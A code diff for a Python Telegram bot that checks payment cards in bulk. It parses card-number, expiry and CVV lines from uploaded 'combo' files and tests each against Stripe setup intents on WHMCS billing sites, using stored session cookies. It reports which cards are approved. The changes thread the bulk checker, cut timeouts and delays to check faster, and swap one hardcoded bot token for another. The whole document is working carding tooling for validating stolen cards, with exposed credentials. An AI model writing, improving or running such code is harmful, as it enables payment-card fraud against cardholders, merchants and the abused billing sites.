@@ -17,7 +17,7 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # قراءة البيانات من ملف .env أو البيئة
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8627020385:AAEQ2YkmQKZiS74tfie3Hy-ricFyMa5CqCw")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8348644269:AAFqxVpdt0nVfFXh2SiL0EISiPULGmMfC9g")
 
 # تحويل معرفات الأدمن من نص إلى أرقام
 admin_env = os.getenv("ADMINS", "8855682617,8011795436")
@@ -164,7 +164,7 @@ def update_gateway(gateway):
         else:
             url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
         
-        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=15)
+        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=10)
         if response.status_code != 200:
             gateway["active"] = False
             gateway["fail_count"] += 1
@@ -212,7 +212,7 @@ def update_gateway(gateway):
         else:
             url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
         
-        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=15)
+        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=10)
         result = response2.json()
         
         if 'setup_intent' in result:
@@ -256,7 +256,7 @@ def create_fresh_setup_intent(gateway):
         else:
             url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
         
-        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=15)
+        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=10)
         if response.status_code != 200:
             return None
         
@@ -298,7 +298,7 @@ def create_fresh_setup_intent(gateway):
         else:
             url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
         
-        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=15)
+        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=10)
         result = response2.json()
         
         if 'setup_intent' in result:
@@ -325,12 +325,11 @@ def update_all_gateways():
 
 # =============== فحص البطاقة ===============
 def check_card_with_gateway(card_line, gateway):
-    intent_data = create_fresh_setup_intent(gateway)
-    
-    if not intent_data:
-        return "❌ FAILED TO CREATE INTENT"
-    
     try:
+        intent_data = create_fresh_setup_intent(gateway)
+        if not intent_data:
+            return "❌ FAILED TO CREATE INTENT"
+        
         parts = card_line.split('|')
         cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
         if len(yy) == 4:
@@ -392,7 +391,7 @@ def extract_cards_from_text(content):
         if line and '|' in line:
             parts = line.split('|')
             if len(parts) >= 4:
-                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+                cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                 if len(yy) == 4:
                     yy = yy[-2:]
                 cards.append(f"{cc}|{mm}|{yy}|{cvv}")
@@ -573,26 +572,38 @@ def gateway_callback(call):
     bot.edit_message_text(f"✅ Gateway selected: {GATEWAYS[idx]['name']}\n━━━━━━━━━━━━━━━━━━━━━\nUse /chk to check card", 
                           call.message.chat.id, call.message.message_id, reply_markup=markup)
 
+# =============== التعديل الأساسي: التعامل مع زر الفحص الجماعي بـ Thread ===============
 @bot.callback_query_handler(func=lambda call: call.data.startswith("combo_gateway_"))
 def combo_gateway_callback(call):
+    # تشغيل عملية فحص الكومبو داخل خيط (Thread) منفصل لتجنب تجمد البوت
+    threading.Thread(target=process_combo_check, args=(call,), daemon=True).start()
+
+def process_combo_check(call):
     user_id = call.from_user.id
     if user_id not in ADMINS and not is_authorized(user_id):
         bot.answer_callback_query(call.id, "❌ Not authorized")
         return
     
-    idx = int(call.data.split("_")[2])
-    file_id = call.data.split("_")[3]
-    
-    if file_id in temp_files:
+    try:
+        parts = call.data.split("_")
+        idx = int(parts[2])
+        file_id = parts[3]
+        
+        if file_id not in temp_files:
+            bot.answer_callback_query(call.id, "❌ File data lost. Please re-upload your file.")
+            bot.send_message(call.message.chat.id, "❌ <b>Session expired or bot restarted!</b>\nPlease upload the file again using /combo.", parse_mode='HTML')
+            return
+        
         cards = temp_files[file_id]['cards']
         total = len(cards)
-        
-        bot.answer_callback_query(call.id, f"✅ Starting check on {GATEWAYS[idx]['name']}")
-        
-        status_msg = bot.edit_message_text(f"🚀 Checking {total} cards on {GATEWAYS[idx]['name']}...\n━━━━━━━━━━━━━━━━━━━━━", 
-                                           call.message.chat.id, call.message.message_id)
-        
         gateway = GATEWAYS[idx]
+        
+        bot.answer_callback_query(call.id, f"✅ Checking on {gateway['name']}...")
+        
+        status_msg = bot.edit_message_text(
+            f"🚀 <b>Checking {total} cards...</b>\n━━━━━━━━━━━━━━━━━━━━━\n🔐 Gateway: <b>{gateway['name']}</b>", 
+            call.message.chat.id, call.message.message_id, parse_mode='HTML'
+        )
         
         approved = 0
         declined = 0
@@ -625,22 +636,24 @@ def combo_gateway_callback(call):
                 results_list.append(f"💳 <code>{card[:12]}...</code> → {result}")
             
             if i % 3 == 0 or i == total:
-                recent_results = "\n".join(results_list[-6:]) if results_list else "No results yet"
+                recent_results = "\n".join(results_list[-5:]) if results_list else "No results yet"
                 progress_text = f"""
 📊 <b>Checking progress</b>
 ━━━━━━━━━━━━━━━━━━━━━
-🔐 {gateway['name']}
-📌 [{i}/{total}] | ✅ {approved} | ❌ {declined}
+🔐 Gateway: <b>{gateway['name']}</b>
+📌 Progress: [{i}/{total}]
+✅ Approved: {approved}
+❌ Declined: {declined}
 ━━━━━━━━━━━━━━━━━━━━━
 <b>Recent results:</b>
 {recent_results}
 """
                 try:
                     bot.edit_message_text(progress_text, call.message.chat.id, status_msg.message_id, parse_mode='HTML')
-                except:
+                except Exception:
                     pass
             
-            time.sleep(0.5)
+            time.sleep(0.3)
         
         final = f"""
 ✅ <b>Completed!</b>
@@ -653,7 +666,12 @@ def combo_gateway_callback(call):
 ⚡ {DEV} | {AUTHOR}
 """
         bot.edit_message_text(final, call.message.chat.id, status_msg.message_id, parse_mode='HTML')
-        del temp_files[file_id]
+        if file_id in temp_files:
+            del temp_files[file_id]
+
+    except Exception as e:
+        print(f"Error in process_combo_check: {e}")
+        bot.send_message(call.message.chat.id, f"❌ Error occurred: {str(e)[:100]}")
 
 @bot.message_handler(commands=["gateway"])
 def gateway_command(message):
@@ -717,11 +735,9 @@ def check_command(message):
             return
         
         status_msg = bot.reply_to(message, "⌛ Checking...")
-        
         gateway = GATEWAYS[selected_gateway_index]
         
         result = check_card_with_gateway(card, gateway)
-        
         bin_info = get_bin_info(parts[0][:6])
         
         result_text = f"""
@@ -776,7 +792,7 @@ def handle_combo_file(message):
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded = bot.download_file(file_info.file_path)
-        content = downloaded.decode('utf-8')
+        content = downloaded.decode('utf-8', errors='ignore')
         
         cards = extract_cards_from_text(content)
         
@@ -814,7 +830,8 @@ if __name__ == "__main__":
     print(f"🔐 {len(GATEWAYS)} Gateways")
     print("=" * 50)
     
-    update_all_gateways()
+    # تحديث البوابات في البداية داخل Thread حتى لا يعطل إقلاع البوت
+    threading.Thread(target=update_all_gateways, daemon=True).start()
     
     print("\n🚀 Bot is running...")
-    bot.infinity_polling()
+    bot.infinity_polling(skip_pending=True)
